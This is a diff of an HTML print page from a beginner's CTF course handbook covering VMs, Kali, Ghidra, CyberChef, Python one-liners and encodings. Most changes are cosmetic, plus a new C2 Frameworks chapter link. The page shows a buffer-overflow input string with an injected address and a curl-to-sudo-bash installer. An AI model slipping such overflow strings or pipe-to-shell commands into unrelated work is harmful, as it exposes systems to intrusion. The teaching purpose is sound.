@@ -1,17 +1,17 @@
 <!DOCTYPE HTML>
-<html lang="en" class="sidebar-visible no-js light">
+<html lang="en" class="light" dir="ltr">
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
         <title>The Beginner&#x27;s CTF Handbook</title>
-        <meta name="robots" content="noindex" />
+        <meta name="robots" content="noindex">
 
 
         <!-- Custom HTML head -->
         
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="theme-color" content="#ffffff" />
+        <meta name="theme-color" content="#ffffff">
 
         <link rel="icon" href="favicon.svg">
         <link rel="shortcut icon" href="favicon.png">
@@ -34,7 +34,7 @@
         <!-- MathJax -->
         <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
     </head>
-    <body>
+    <body class="sidebar-visible no-js">
     <div id="body-container">
         <!-- Provide site root to javascript -->
         <script>
@@ -64,31 +64,38 @@
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
             var html = document.querySelector('html');
-            html.classList.remove('no-js')
             html.classList.remove('light')
             html.classList.add(theme);
-            html.classList.add('js');
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
         </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            var html = document.querySelector('html');
+            var body = document.querySelector('body');
             var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
             } else {
                 sidebar = 'hidden';
             }
-            html.classList.remove('sidebar-visible');
-            html.classList.add("sidebar-" + sidebar);
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">Introduction</a></li><li class="chapter-item "><a href="tools/tools.html"><strong aria-hidden="true">1.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/vms.html"><strong aria-hidden="true">1.1.</strong> Virtual Machines</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/hypervisors.html"><strong aria-hidden="true">1.1.1.</strong> Hypervisors</a></li><li class="chapter-item "><a href="tools/vm-snapshots.html"><strong aria-hidden="true">1.1.2.</strong> Snapshots</a></li><li class="chapter-item "><a href="tools/vm-shared.html"><strong aria-hidden="true">1.1.3.</strong> Shared Files on VMware</a></li></ol></li><li class="chapter-item "><a href="tools/kali.html"><strong aria-hidden="true">1.2.</strong> Kali Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/kali-hyperv.html"><strong aria-hidden="true">1.2.1.</strong> Kali on Hyper-V</a></li><li class="chapter-item "><a href="tools/kali-tweaks.html"><strong aria-hidden="true">1.2.2.</strong> kali-tweaks</a></li><li class="chapter-item "><a href="tools/openssh.html"><strong aria-hidden="true">1.2.3.</strong> SSH into Kali</a></li></ol></li><li class="chapter-item "><a href="tools/winbox.html"><strong aria-hidden="true">1.3.</strong> Quick Windows Box</a></li><li class="chapter-item "><a href="tools/gdb.html"><strong aria-hidden="true">1.4.</strong> Build Tools</a></li><li class="chapter-item "><a href="tools/ghidra.html"><strong aria-hidden="true">1.5.</strong> Ghidra</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/ghidra2.html"><strong aria-hidden="true">1.5.1.</strong> Ghidra Issues?</a></li></ol></li><li class="chapter-item "><a href="tools/cyberchefintro.html"><strong aria-hidden="true">1.6.</strong> Cyberchef</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/cyberchef.html"><strong aria-hidden="true">1.6.1.</strong> Cyberchef example 1</a></li><li class="chapter-item "><a href="tools/cyberchef2.html"><strong aria-hidden="true">1.6.2.</strong> Cyberchef example 2</a></li></ol></li><li class="chapter-item "><a href="Python/python.html"><strong aria-hidden="true">1.7.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Python/interactive.html"><strong aria-hidden="true">1.7.1.</strong> Interactive Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Python/extendingcolab.html"><strong aria-hidden="true">1.7.1.1.</strong> Extending Colab</a></li></ol></li><li class="chapter-item "><a href="Python/commandline.html"><strong aria-hidden="true">1.7.2.</strong> Single Line Scripts</a></li><li class="chapter-item "><a href="Python/pythonwebserver.html"><strong aria-hidden="true">1.7.3.</strong> Quick Webserver</a></li></ol></li><li class="chapter-item "><a href="tools/vpns.html"><strong aria-hidden="true">1.8.</strong> VPNs</a></li></ol></li><li class="chapter-item "><a href="fundamentals/fundamentals.html"><strong aria-hidden="true">2.</strong> Fundamentals</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="fundamentals/charencoding.html"><strong aria-hidden="true">2.1.</strong> Character Encoding</a></li><li class="chapter-item "><a href="fundamentals/base64.html"><strong aria-hidden="true">2.2.</strong> Base64 Encoding</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="fundamentals/httpbasic64.html"><strong aria-hidden="true">2.2.1.</strong> HTTP Basic Authentication</a></li></ol></li><li class="chapter-item "><a href="fundamentals/endianness.html"><strong aria-hidden="true">2.3.</strong> Endianness</a></li><li class="chapter-item "><a href="Python/bytes.html"><strong aria-hidden="true">2.4.</strong> Handling bytes in Python</a></li><li class="chapter-item "><a href="Python/pythonxor.html"><strong aria-hidden="true">2.5.</strong> Python XOR</a></li></ol></li><li class="chapter-item "><a href="passwords/passwords-intro.html"><strong aria-hidden="true">3.</strong> Passwords</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="passwords/cracking.html"><strong aria-hidden="true">3.1.</strong> Password cracking</a></li></ol></li><li class="chapter-item "><a href="binaryexploit/binaryexploit.html"><strong aria-hidden="true">4.</strong> Binary Exploits</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="binaryexploit/echo.html"><strong aria-hidden="true">4.1.</strong> Crafting Exploit Strings</a></li><li class="chapter-item "><a href="bufferoverflow/bufferoverflow.html"><strong aria-hidden="true">4.2.</strong> Buffer Overflows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="bufferoverflow/stack.html"><strong aria-hidden="true">4.2.1.</strong> Stack Organization</a></li></ol></li><li class="chapter-item "><a href="binaryexploit/disas.html"><strong aria-hidden="true">4.3.</strong> Quick Disassembly</a></li><li class="chapter-item "><a href="binaryexploit/formatstring.html"><strong aria-hidden="true">4.4.</strong> Format String Exploit</a></li></ol></li><li class="chapter-item "><a href="injections/injections.html"><strong aria-hidden="true">5.</strong> Injections</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="injections/sqlinjection.html"><strong aria-hidden="true">5.1.</strong> SQL Injections</a></li><li class="chapter-item "><a href="injections/ssti.html"><strong aria-hidden="true">5.2.</strong> Template Injections</a></li></ol></li></ol>
+                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">Introduction</a></li><li class="chapter-item "><a href="tools/tools.html"><strong aria-hidden="true">1.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/vms.html"><strong aria-hidden="true">1.1.</strong> Virtual Machines</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/hypervisors.html"><strong aria-hidden="true">1.1.1.</strong> Hypervisors</a></li><li class="chapter-item "><a href="tools/vm-snapshots.html"><strong aria-hidden="true">1.1.2.</strong> Snapshots</a></li><li class="chapter-item "><a href="tools/vm-shared.html"><strong aria-hidden="true">1.1.3.</strong> Shared Files on VMware</a></li></ol></li><li class="chapter-item "><a href="tools/kali.html"><strong aria-hidden="true">1.2.</strong> Kali Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/kali-hyperv.html"><strong aria-hidden="true">1.2.1.</strong> Kali on Hyper-V</a></li><li class="chapter-item "><a href="tools/kali-tweaks.html"><strong aria-hidden="true">1.2.2.</strong> kali-tweaks</a></li><li class="chapter-item "><a href="tools/openssh.html"><strong aria-hidden="true">1.2.3.</strong> SSH into Kali</a></li></ol></li><li class="chapter-item "><a href="tools/winbox.html"><strong aria-hidden="true">1.3.</strong> Quick Windows Box</a></li><li class="chapter-item "><a href="tools/gdb.html"><strong aria-hidden="true">1.4.</strong> Build Tools</a></li><li class="chapter-item "><a href="tools/ghidra.html"><strong aria-hidden="true">1.5.</strong> Ghidra</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/ghidra2.html"><strong aria-hidden="true">1.5.1.</strong> Ghidra Issues?</a></li></ol></li><li class="chapter-item "><a href="tools/cyberchefintro.html"><strong aria-hidden="true">1.6.</strong> Cyberchef</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="tools/cyberchef.html"><strong aria-hidden="true">1.6.1.</strong> Cyberchef example 1</a></li><li class="chapter-item "><a href="tools/cyberchef2.html"><strong aria-hidden="true">1.6.2.</strong> Cyberchef example 2</a></li></ol></li><li class="chapter-item "><a href="Python/python.html"><strong aria-hidden="true">1.7.</strong> Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Python/interactive.html"><strong aria-hidden="true">1.7.1.</strong> Interactive Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Python/extendingcolab.html"><strong aria-hidden="true">1.7.1.1.</strong> Extending Colab</a></li></ol></li><li class="chapter-item "><a href="Python/commandline.html"><strong aria-hidden="true">1.7.2.</strong> Single Line Scripts</a></li><li class="chapter-item "><a href="Python/pythonwebserver.html"><strong aria-hidden="true">1.7.3.</strong> Quick Webserver</a></li></ol></li><li class="chapter-item "><a href="tools/vpns.html"><strong aria-hidden="true">1.8.</strong> VPNs</a></li></ol></li><li class="chapter-item "><a href="fundamentals/fundamentals.html"><strong aria-hidden="true">2.</strong> Fundamentals</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="fundamentals/charencoding.html"><strong aria-hidden="true">2.1.</strong> Character Encoding</a></li><li class="chapter-item "><a href="fundamentals/base64.html"><strong aria-hidden="true">2.2.</strong> Base64 Encoding</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="fundamentals/httpbasic64.html"><strong aria-hidden="true">2.2.1.</strong> HTTP Basic Authentication</a></li></ol></li><li class="chapter-item "><a href="fundamentals/endianness.html"><strong aria-hidden="true">2.3.</strong> Endianness</a></li><li class="chapter-item "><a href="Python/bytes.html"><strong aria-hidden="true">2.4.</strong> Handling bytes in Python</a></li><li class="chapter-item "><a href="Python/pythonxor.html"><strong aria-hidden="true">2.5.</strong> Python XOR</a></li></ol></li><li class="chapter-item "><a href="passwords/passwords-intro.html"><strong aria-hidden="true">3.</strong> Passwords</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="passwords/cracking.html"><strong aria-hidden="true">3.1.</strong> Password cracking</a></li></ol></li><li class="chapter-item "><a href="binaryexploit/binaryexploit.html"><strong aria-hidden="true">4.</strong> Binary Exploits</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="binaryexploit/echo.html"><strong aria-hidden="true">4.1.</strong> Crafting Exploit Strings</a></li><li class="chapter-item "><a href="bufferoverflow/bufferoverflow.html"><strong aria-hidden="true">4.2.</strong> Buffer Overflows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="bufferoverflow/stack.html"><strong aria-hidden="true">4.2.1.</strong> Stack Organization</a></li></ol></li><li class="chapter-item "><a href="binaryexploit/disas.html"><strong aria-hidden="true">4.3.</strong> Quick Disassembly</a></li><li class="chapter-item "><a href="binaryexploit/formatstring.html"><strong aria-hidden="true">4.4.</strong> Format String Exploit</a></li></ol></li><li class="chapter-item "><a href="injections/injections.html"><strong aria-hidden="true">5.</strong> Injections</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="injections/sqlinjection.html"><strong aria-hidden="true">5.1.</strong> SQL Injections</a></li><li class="chapter-item "><a href="injections/ssti.html"><strong aria-hidden="true">5.2.</strong> Template Injections</a></li></ol></li><li class="chapter-item "><a href="c2/sliver.html"><strong aria-hidden="true">6.</strong> C2 Frameworks</a></li></ol>
             </div>
-            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
         </nav>
 
         <!-- Track and set sidebar scroll position -->
@@ -119,9 +126,9 @@
                                 <div id="menu-bar-hover-placeholder"></div>
                 <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
-                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                             <i class="fa fa-bars"></i>
-                        </button>
+                        </label>
                         <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                             <i class="fa fa-paint-brush"></i>
                         </button>
@@ -174,9 +181,9 @@
 <img src="keypadlock.png" alt="Course Banner Image">
 <p>In this course, we're going to learn the basic tactics, techniques, and procedures associated with solving CTF challenges. Along the way, I hope you will pick up on some key cybersecurity basics.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="ctf-tools"><a class="header" href="#ctf-tools">CTF Tools</a></h1>
-<p>Over the next few pages we will take a look at the tools we will use in this course. </p>
+<p>Over the next few pages we will take a look at the tools we will use in this course.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="virtual-machines"><a class="header" href="#virtual-machines">Virtual Machines</a></h1>
-<p>Many of us run our CTF/penetration testing tools inside a <em>virtual</em> machine instead of on our desktop. </p>
+<p>Many of us run our CTF/penetration testing tools inside a <em>virtual</em> machine instead of on our desktop.</p>
 <p>This helps because we can:</p>
 <ul>
 <li>keep our own machines free of extraneous tools</li>
@@ -210,7 +217,7 @@
 <li>Great choice if you are on a Linux distro. Instructions for enabling on Debian distros <a href="https://wiki.debian.org/KVM">here</a>.</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="vm-snapshots"><a class="header" href="#vm-snapshots">VM Snapshots</a></h1>
-<p>One of the coolest features of VMs is the ability to take &quot;snapshots&quot;. You are, in essence, saving the state of a VM at that instant in time. You can then roll back changes to a previous known state whenever needed.</p>
+<p>One of the coolest features of VMs is the ability to take "snapshots". You are, in essence, saving the state of a VM at that instant in time. You can then roll back changes to a previous known state whenever needed.</p>
 <p>For CTF competitions, a workflow I see quite a bit is:</p>
 <ol>
 <li>Create a VM and tweak with all the tools you will need.</li>
@@ -226,7 +233,7 @@
 <p><img src="tools/checkpoint2.png" alt="Checkpointing Image" /></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="creating-a-shared-file-space-between-your-host-and-guest-vm"><a class="header" href="#creating-a-shared-file-space-between-your-host-and-guest-vm">Creating a shared file space between your host and guest (VM).</a></h1>
 <h2 id="warning-one-of-the-main-reasons-we-run-vms-is-to-create-isolation-between-our-work-machine-and-potentially-malicious-code-think-hard-about-the-implications-of-allowing-a-guest-vm-access-to-some-of-your-files"><a class="header" href="#warning-one-of-the-main-reasons-we-run-vms-is-to-create-isolation-between-our-work-machine-and-potentially-malicious-code-think-hard-about-the-implications-of-allowing-a-guest-vm-access-to-some-of-your-files">Warning: One of the main reasons we run VMs is to create isolation between our work machine and potentially malicious code. Think hard about the implications of allowing a guest VM access to some of your files.</a></h2>
-<p>To create a shared file space between your host and VM, you can use the Settings area of VMware Player and select &quot;Shared Folders&quot;.</p>
+<p>To create a shared file space between your host and VM, you can use the Settings area of VMware Player and select "Shared Folders".</p>
 <p><img src="tools/vmware-shared.png" alt="image that shows vmware shared folder settings" /></p>
 <p>On your Kali VM, complete the following:</p>
 <pre><code>sudo mkdir /mnt/shared
@@ -254,7 +261,7 @@
 <li>Windows Dev images for some proof-of-concept work. Info <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">here.</a></li>
 <li>Windows Sandbox mode <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview">Link to Sandbox mode.</a></li>
 </ul>
-<p>Contact me if you are planning to use a Mac or Linux laptop for this course. </p>
+<p>Contact me if you are planning to use a Mac or Linux laptop for this course.</p>
 <p>Ready to install Kali on Hyper-V? Follow these instructions:</p>
 <ol>
 <li>Enable Hyper-V if you haven't already. Instructions are <a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">here</a>.</li>
@@ -265,7 +272,7 @@
 <li>Follow <a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/">these instructions</a> on how to make Enhanced Session Mode active. This will allow you to use the clipboard effectively.</li>
 <li>Use your newly found Copy/Paste abilities to transfer a new desktop wallpaper to your Kali instance, for example from <a href="https://github.com/dorianpro/kali-linux-wallpapers">here</a>.</li>
 </ol>
-<p>At this point, you should have Kali in a beautifully rendered screen with a functioning clipboard. </p>
+<p>At this point, you should have Kali in a beautifully rendered screen with a functioning clipboard.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="kali-tweaks"><a class="header" href="#kali-tweaks">kali-tweaks</a></h1>
 <p>Be sure to check out the <code>kali-tweaks</code> command. You will find some nice customization options here.</p>
 <p><img src="tools/kali-tweaks.png" alt="kali-tweaks menu" /></p>
@@ -285,13 +292,13 @@
 <pre><code>ip a
 </code></pre>
 <p><img src="tools/ipaddr.png" alt="image" /></p>
-<p>In the above case, the address of your VM is <code>192.168.46.91</code> and your username is <code>kali</code>. </p>
+<p>In the above case, the address of your VM is <code>192.168.46.91</code> and your username is <code>kali</code>.</p>
 <p>You should be able to log in from your desktop now using:</p>
 <pre><code>ssh kali@192.168.46.9
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="creating-a-quick-windows-machine-for-analysis-work"><a class="header" href="#creating-a-quick-windows-machine-for-analysis-work">Creating a quick Windows Machine for Analysis Work</a></h1>
 <p>Sometimes you need to create a quick Windows VM for analysis work. Here's one way:</p>
-<p>In Hyper-V, select <strong>Quick Create</strong> from the <strong>Actions</strong> panel. </p>
+<p>In Hyper-V, select <strong>Quick Create</strong> from the <strong>Actions</strong> panel.</p>
 <p><img src="tools/winbox.png" alt="Hyper-V " /></p>
 <p>Then select the <strong>Windows 11 dev environment</strong>. This will create a Windows VM that is ready to go. The best part? All of the Windows stuff (Xbox Live, OneDrive, etc.) that requires you to sign in with an account has been disabled.</p>
 <p><img src="tools/winbox2.png" alt="Hyper-V " /></p>
@@ -305,7 +312,7 @@
 <p><code>sudo apt install gdb</code></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="ghidra"><a class="header" href="#ghidra">Ghidra</a></h1>
 <p>Ghidra is an open source tool from the National Security Agency (yes, that NSA!) that we use for reverse engineering.</p>
-<p>Ghidra is a Java app, so you need a working JDK before you can run it. </p>
+<p>Ghidra is a Java app, so you need a working JDK before you can run it.</p>
 <ol>
 <li>
 <p>On a Linux machine, you can check your Java version with:</p>
@@ -314,8 +321,8 @@
 </li>
 <li>
 <p>Look for the version output, something like:
-<code>openjdk version &quot;17.0.8&quot; 2023-07-18</code>
-Be sure that you have version 17 or higher. </p>
+<code>openjdk version "17.0.8" 2023-07-18</code>
+Be sure that you have version 17 or higher.</p>
 </li>
 <li>
 <p>If you need to install Java, you can use the following command on Kali Linux.</p>
@@ -328,7 +335,7 @@ Be sure that you have version 17 or higher. </p>
 <li>
 <p>Unzip the file. In the unzipped archive, you will find a script to start Ghidra.</p>
 <ul>
-<li>On UNIX-like systems, run the file </li>
+<li>On UNIX-like systems, run the file</li>
 </ul>
 <pre><code>./ghidraRun
 </code></pre>
@@ -346,7 +353,7 @@ Be sure that you have version 17 or higher. </p>
 <ol>
 <li>
 <p>Install sdkman</p>
-<pre><code>sudo curl -s &quot;https://get.sdkman.io&quot; | bash
+<pre><code>sudo curl -s "https://get.sdkman.io" | bash
 </code></pre>
 </li>
 <li>
@@ -373,8 +380,8 @@ Be sure that you have version 17 or higher. </p>
 </li>
 </ol>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="cyberchef"><a class="header" href="#cyberchef">Cyberchef</a></h1>
-<p>Cyberchef is a tool put out by the GCHQ which is &quot;the UK's intelligence, security and cyber agency&quot;. It's a web-app that aims to be your go-to tool for hacking data manipulation.</p>
-<p>You can find it on the web <a href="https://gchq.github.io/CyberChef/">here</a> or inside many infosec packages like Security Onion. </p>
+<p>Cyberchef is a tool put out by the GCHQ which is "the UK's intelligence, security and cyber agency". It's a web-app that aims to be your go-to tool for hacking data manipulation.</p>
+<p>You can find it on the web <a href="https://gchq.github.io/CyberChef/">here</a> or inside many infosec packages like Security Onion.</p>
 <p><img src="tools/cyberchef1.png" alt="Starting image of Cyberchef" /></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="cyberchef-example"><a class="header" href="#cyberchef-example">Cyberchef Example</a></h1>
 <p>Here's an example:</p>
@@ -394,7 +401,7 @@ Be sure that you have version 17 or higher. </p>
 <p>Let's say we find the following message when reverse engineering a binary.</p>
 <pre><code>ttmq3a2X8YKp2qmDp8Kr2avPu4O9wrOCqcyqzraSqJCR45zsk8qK7urJqQ==
 </code></pre>
-<p>We know from inspecting the executable there is an XOR binary operation to obfuscate the text. But our keen eyes notice this is a Base64 encoded string. </p>
+<p>We know from inspecting the executable there is an XOR binary operation to obfuscate the text. But our keen eyes notice this is a Base64 encoded string.</p>
 <p>Build a recipe that:</p>
 <ol>
 <li>Decodes the Base64 encoded string.</li>
@@ -429,7 +436,7 @@ Be sure that you have version 17 or higher. </p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="single-line-python-scripts"><a class="header" href="#single-line-python-scripts">Single Line Python Scripts</a></h1>
 <p>Did you know you can run single line Python scripts from the command line using the -c argument?</p>
 <p>Try the following:</p>
-<pre><code>python -c &quot;print('A'*46)&quot;
+<pre><code>python -c "print('A'*46)"
 </code></pre>
 <p>Output</p>
 <pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -437,7 +444,7 @@ Be sure that you have version 17 or higher. </p>
 <p>Single line program to create 46 A characters. But why?</p>
 <p>When we get around to creating buffer overflows, keep this tool in mind. We often need to create a long string that fills up a buffer and then injects characters beyond it.</p>
 <p>For example, I could fill up the buffer with a 46 'A' characters and then start injecting additional hex characters I want using this simple command line:</p>
-<pre><code>python -c &quot;print('A'*46 + '\xd0\x8f\x04\x08')&quot;
+<pre><code>python -c "print('A'*46 + '\xd0\x8f\x04\x08')"
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="ultra-simple-web-file-sharing-using-python"><a class="header" href="#ultra-simple-web-file-sharing-using-python">Ultra simple web file sharing using Python</a></h1>
 <p>Need to share files quickly? Python has your back.</p>
@@ -460,20 +467,20 @@ Be sure that you have version 17 or higher. </p>
 <p>You will need the VPN information (host name, port, etc.) from the lab manager. This may come in the form of a file that you import.</p>
 <p><em>WARNING: Most VPNs of this sort are classified as SPLIT TUNNEL networks. Only traffic destined for the private network is tunneled. <strong>All other traffic is sent normally.</strong> Be sure that activities like port scanning, vulnerability scanning, endpoint enumeration, etc. are done only on assets that are part of the private network.</em></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="fundamental-skills"><a class="header" href="#fundamental-skills">Fundamental Skills</a></h1>
-<p>We run into a lot of binary data in CTF competitions, reverse engineering, incident response, etc. It's beneficial, therefore, to practice common ways of dealing with binary data. </p>
+<p>We run into a lot of binary data in CTF competitions, reverse engineering, incident response, etc. It's beneficial, therefore, to practice common ways of dealing with binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="character-encoding"><a class="header" href="#character-encoding">Character Encoding</a></h1>
 <p>In short, character encoding is the mapping between a character and a numerical value that can be stored in memory. Long ago, computers in North America used 7 bits to encode all characters, which provided a usable character-set of 128 different values. Since most computers dealt with 8 bits as a byte, these 7 bits were later extended to 8 bits, or 256 possible combinations. This ASCII standard was used for decades -- at least in North America.</p>
-<p>As applications and operating systems were built to support more languages, it became clear that better encoding systems were needed. The UTF-8 and UTF-16 systems have become widely used as ways to encode characters from different languages. </p>
-<p>You should be comfortable referencing the ASCII and UTF-8 tables to go between characters and values, either in decimal or hexadecimal form. UTF-16 is used in Java and in Windows programming, so it is possible to see that as well. </p>
-<p>Bookmark ASCII and UTF-8 tables on your CTF workstation of choice. </p>
+<p>As applications and operating systems were built to support more languages, it became clear that better encoding systems were needed. The UTF-8 and UTF-16 systems have become widely used as ways to encode characters from different languages.</p>
+<p>You should be comfortable referencing the ASCII and UTF-8 tables to go between characters and values, either in decimal or hexadecimal form. UTF-16 is used in Java and in Windows programming, so it is possible to see that as well.</p>
+<p>Bookmark ASCII and UTF-8 tables on your CTF workstation of choice.</p>
 <p>Or try the following in one line Python script:</p>
-<pre><code>python -c &quot;for i in range(32, 127): print('|', i, '|', hex(i), '|', chr(i), '|')&quot;
+<pre><code>python -c "for i in range(32, 127): print('|', i, '|', hex(i), '|', chr(i), '|')"
 </code></pre>
 <p>ASCII / UTF-8 (American English) encoding:</p>
 <div class="table-wrapper"><table><thead><tr><th>Dec</th><th>Hex</th><th>Char</th></tr></thead><tbody>
 <tr><td>32</td><td>0x20</td><td>Spc</td></tr>
 <tr><td>33</td><td>0x21</td><td>!</td></tr>
-<tr><td>34</td><td>0x22</td><td>&quot;</td></tr>
+<tr><td>34</td><td>0x22</td><td>"</td></tr>
 <tr><td>35</td><td>0x23</td><td>#</td></tr>
 <tr><td>36</td><td>0x24</td><td>$</td></tr>
 <tr><td>37</td><td>0x25</td><td>%</td></tr>
@@ -568,8 +575,8 @@ Be sure that you have version 17 or higher. </p>
 <tr><td>126</td><td>0x7e</td><td>~</td></tr>
 </tbody></table>
 </div><div style="break-before: page; page-break-before: always;"></div><h1 id="base64-encoding"><a class="header" href="#base64-encoding">Base64 Encoding</a></h1>
-<p>Sometimes we need to share binary data with others and one way to do this is in text form. But as we saw in the <em>Character Encoding</em> section, there is a careful mapping between characters and numerical values. </p>
-<p>Let's say we want to share a single byte. If that byte has a value between 32 and 126, it would be possible to send the ASCII representation of the value over plaintext. For example, a byte of value 0x41 could be represented as A. </p>
+<p>Sometimes we need to share binary data with others and one way to do this is in text form. But as we saw in the <em>Character Encoding</em> section, there is a careful mapping between characters and numerical values.</p>
+<p>Let's say we want to share a single byte. If that byte has a value between 32 and 126, it would be possible to send the ASCII representation of the value over plaintext. For example, a byte of value 0x41 could be represented as A.</p>
 <p>But what happens to the byte values outside the printable range? To accommodate for scenarios such as these a binary to text encoding scheme known as Base64 was invented. Every 6 bits of binary data are represented by an 8 bit character. Since 2^6 is 64, we need only part of the typical ASCII character set.</p>
 <p>This ratio of 8 bit characters to 6 bit encoding means that, for every 3 bytes of data, we need 4 bytes of characters to encode it.</p>
 <p>What happens in the case where the data is not a simple multiple of 6 bits? The values are padded with zeros and the = character appears.</p>
@@ -589,7 +596,7 @@ Be sure that you have version 17 or higher. </p>
 </code></pre>
 <ol>
 <li>
-<p>Can you decode it? </p>
+<p>Can you decode it?</p>
 </li>
 <li>
 <p>Why is it not used anymore?</p>
@@ -599,7 +606,7 @@ Be sure that you have version 17 or higher. </p>
 </li>
 </ol>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="endianness-little-endian-vs-big-endian"><a class="header" href="#endianness-little-endian-vs-big-endian">Endianness: Little Endian vs. Big Endian</a></h1>
-<p>Understanding endianness, or how data is stored in memory, is an important skill to have since we deal with so much in binary form. </p>
+<p>Understanding endianness, or how data is stored in memory, is an important skill to have since we deal with so much in binary form.</p>
 <p>In essence, let's look at how a value such as this 32-bit (four byte) integer, 0xdeadbeef, is stored in memory. The two most common ways are little endian and big endian. Let's take a look at how those two approaches differ. Let's say we're storing those four bytes starting at address 0x100.</p>
 <p><img src="fundamentals/endianness.png" alt="endianness diagram" /></p>
 <p>If you have Ghidra already installed, take a look at <a href="fundamentals/hardcoded">this binary file.</a></p>
@@ -632,7 +639,7 @@ Be sure that you have version 17 or higher. </p>
   local_35 = 0x6f77206f;
   local_31 = 0x2e646c72;
   local_2d = 10;
-  printf(&quot;\n %s&quot;,(char *)&amp;local_39);
+  printf("\n %s",(char *)&amp;local_39);
   return;
 }
 </code></pre>
@@ -670,7 +677,7 @@ Be sure that you have version 17 or higher. </p>
 </code></pre>
 <p>This function assumes your key is long enough to align with <code>bytes_in</code>. If need be, extend the key by repeating it over and over until it is long enough before calling this function.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="cracking-passwords"><a class="header" href="#cracking-passwords">Cracking passwords</a></h1>
-<p>While occasionally we see vendors really screw up and store passwords in plaintext, nearly all passwords are hashed in some form. </p>
+<p>While occasionally we see vendors really screw up and store passwords in plaintext, nearly all passwords are hashed in some form.</p>
